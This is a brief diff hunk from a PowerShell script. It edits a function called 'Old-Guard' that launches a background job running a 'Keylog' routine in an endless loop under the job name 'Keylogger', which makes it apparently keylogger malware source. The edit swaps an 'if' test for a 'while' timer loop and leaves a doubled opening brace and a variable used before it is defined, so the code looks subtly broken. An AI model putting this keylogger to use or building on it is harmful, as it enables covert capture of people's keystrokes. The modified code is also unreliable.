@@ -235,7 +235,7 @@ function Old-Guard {
 
     Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name Keylogger | Out-Null
 
-    if ($PSBoundParameters['CollectionInterval'])
+    while ($timer.Elapsed.TotalSeconds -lt $CollectionInterval *60) {
     {
         $Timer = New-Object Timers.Timer($CollectionInterval)
 
